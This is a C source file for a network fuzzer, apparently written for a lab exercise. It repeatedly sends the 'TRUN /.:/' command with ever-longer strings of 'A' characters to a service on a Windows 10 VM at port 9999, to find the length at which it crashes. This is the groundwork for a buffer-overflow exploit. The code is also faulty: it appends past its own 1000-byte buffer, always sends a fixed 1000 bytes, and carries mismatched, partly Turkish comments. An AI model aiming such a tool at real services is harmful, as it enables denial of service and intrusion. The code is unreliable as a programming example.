#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
    Coder: amaym0nn
    A simple fuzzing script in C

*/


int main() {
    char buff[1000] = "TRUN /.:/";
    int nm = 100;
        while(1) {
            int scket = socket(AF_INET, SOCK_STREAM, 0);
                if (scket == -1) {
                    printf("Not Create Socket....\n");
                }
                else {
                    struct sockaddr_in sock;
                        sock.sin_addr.s_addr = inet_addr("192.168.0.27");
                        sock.sin_family = AF_INET;
                        sock.sin_port = htons(9999);
                            // Server: 192.168.0.27:9999 (vm windows 10)

                         int cnt = connect(scket, (struct sockaddr*)&sock, sizeof(sock));
                          if (cnt == -1) {
                            printf("Connection Error...");
                            close(scket);
                          }
                            int i = 0;
                             for(; i < nm + 8; i++) {
                                /*
                                    This loop adds the value "A" to the buff variable up to nm+8 (108).
                                    But when he gets out of this cycle and comes back, that increase is doubled. For example, after increasing 100 times in this loop and exiting the loop, 
                                    nm will be 200 when it comes back to this loop after increasing it 100 times. This way it will increase. 
                                */
                                strcat(buff, "A"); // Here it adds nm+8 times A to the buff variable. For example, the result would be something like: TRUN /.:/AAAAAAAAAAAAAA.
                                printf("Buff Lenght: %d\n", strlen(buff));  // Burada program hangi uzunlukta crash verdiğini görebilmek için buff değişkenin sürekli aktif olarak uzunluğu ekrana bastırılıyor
                             }
                             int wr = write(scket, buff, sizeof(buff)); // Here, the length of the buff variable is actively suppressed to the screen so that the program can see how long it crashes.
                                if (wr == -1) {
                                    printf("Crashed At......");
                                    close(scket);
                                }
                             nm += 100; 
                             sleep(1);
                }

                
        }
}